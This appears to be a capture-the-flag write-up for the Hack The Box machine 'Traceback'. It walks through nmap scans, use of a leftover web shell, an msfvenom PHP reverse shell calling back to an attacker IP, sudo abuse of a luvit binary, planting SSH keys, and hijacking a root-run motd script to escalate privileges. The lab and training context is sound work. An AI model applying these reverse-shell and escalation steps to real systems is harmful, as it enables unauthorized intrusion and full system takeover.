# Traceback

Machine IP:  10.10.10.181 

# Enumeration

```s
nmap -sV -sC 10.10.10.181
```

Service detection: `-sV`

Output:

```s
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 96:25:51:8e:6c:83:07:48:ce:11:4b:1f:e5:6d:8a:28 (RSA)
|   256 54:bd:46:71:14:bd:b2:42:a1:b6:b0:2d:94:14:3b:0d (ECDSA)
|_  256 4d:c3:f8:52:b8:85:ec:9c:3e:4d:57:2c:4a:82:fd:86 (ED25519)
80/tcp open  http    Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
|_http-title: Help us
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

`http-title` is interesting.

```s
nmap -sC -sV -A -v -p- -oA full_scan 10.10.10.181 -T4
```

No further interesting things.

# Port 80

Apache httpd 2.4.29 ((Ubuntu)) server on port 80. Have a visit: `http://10.10.10.181:80`.

Enumerating it further. Found the following stuff:

```s
http://10.10.10.181:80/icons/           403 (Forbidden)
http://10.10.10.181:80/icons/small/     403 (Forbidden)
http://10.10.10.181:80/index.html       200 (OK)
http://10.10.10.181:80/server-status    403 (Forbidden)
```

# Source-code (Foothold)

Sourcecode of the page says `<!--Some of the best web shells that you might need ;)-->`. On searching this along with `Xh4H`, we reach this [tweet](https://twitter.com/riftwhitehat/status/1237311680276647936?lang=en) by the same person pointing to a repo of some web shells. Searching these on the actual server, one hit is found.

```
http://10.10.10.181/smevk.php
```

Opening this file `smevk.php`, the username and password are `admin` and `admin`.

This is a pretty useless shell, except it has write access. So cool. Let us create a custom payload and send it there.

1. `msfvenom -p php/meterpreter/reverse_tcp LHOST=10.10.14.45 LPORT=1234 -f raw -o shell.php`

2. Set up a listener

```
use exploit/multi/handler 
set LHOST 10.10.14.45
set LPORT 1234
set PAYLOAD php/meterpreter/reverse_tcp 
exploit
```

3. Load `http://10.10.10.181/shell.php` in the browser.

4. Type `shell` to get a shell.

5. Upgrade the shell: `python3 -c 'import pty;pty.spawn("/bin/bash")'`


# Enumeration inside the system

Inside the home directory, there is this `webadmin` which has a `note.txt` which says:

```
- sysadmin -
I have left a tool to practice Lua.
I'm sure you know where to find it.
Contact me if you have any question.
```

Running `sudo -l` gives the following:

`(sysadmin) NOPASSWD: /home/sysadmin/luvit`

Running `sudo -u sysadmin /home/sysadmin/luvit` runs a lua file.

# Privelege escalation to user sysadmin

Spawn a shell:

```
sudo -u sysadmin /home/sysadmin/luvit -e 'os.execute("/bin/sh")'
```

Upgrade the shell using `python3 -c 'import pty;pty.spawn("/bin/bash")'`

Go to the `user.txt` in `home` to get the user flag.

# Privelege escalation to root

Further searching reveals `OpenSSH RSA public key` file in `.ssh` directory within `sysadmin` in `home`. Then tried to add a known host to those files for a passwordless login:


1. `ssh-keygen` on local system: generates private and public keys

2. Copy entire public key to the `sysadmin` `authorized_keys` on the remote end. `echo ... > authorized_keys`

3. Attempt login `ssh sysadmin@10.10.10.181` from your end. You will see `Welcome to Xh4H land`.

On further searching, found that these are located in `/etc/update-motd.d` as `00-header` which is writable by the group `sysadmin` and created by `root`. 

1. Add `echo "cat root/root.txt" >> 00-header` (I guess this >> is there instead of > because we need to append not overwrite).

2. Re-attempt ssh login from the device. The hash gets printed.


And how exactly I searched? `linpeas` from [this link](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh
) gave output that involved:

```
/bin/sh -c sleep 30 ; /bin/cp /var/backup/.update-motd.d/* /etc/update-motd.d/
```

Implies a shell script that after every 30 seconds copies the contents of backup motd to the main motd. 

Sending `linpeas` over `nc` was not sufficient. Needed to:

1. `python -m SimpleHTTPServer 80` on the attacker machine.

2. `wget http://IP:80/linpeas.sh` and `sh linpeas.sh`